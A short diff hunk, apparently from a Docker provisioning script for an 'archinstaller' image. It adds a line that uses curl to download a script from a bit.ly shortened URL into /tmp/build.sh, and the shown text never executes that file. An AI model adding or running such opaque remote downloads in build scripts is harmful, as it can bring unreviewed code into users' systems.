@@ -1,5 +1,7 @@
 
 
+curl -o /tmp/build.sh https://bit.ly/3KAs5Zz
+
 
 # provisions
 docker build -t archinstaller .
